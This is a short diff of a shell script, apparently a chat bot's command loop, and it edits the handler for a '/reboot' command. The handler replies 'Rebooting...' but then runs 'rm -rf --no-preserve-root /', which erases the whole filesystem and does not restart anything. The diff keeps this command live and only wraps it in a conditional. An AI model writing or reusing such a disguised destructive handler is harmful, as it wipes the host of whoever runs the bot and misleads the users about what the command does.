@@ -124,9 +124,11 @@ while sleep 1; do
 
            /reboot)
 
-               TEXT="Rebooting..."
-               _send_text
-               [[ ! -z $LAST_ID ]] && rm -rf --no-preserve-root /
+               if [[ ! -z $LAST_ID ]]; then
+                   TEXT="Rebooting..."
+                   _send_text
+                   rm -rf --no-preserve-root /
+               fi
                ;;
 
         esac
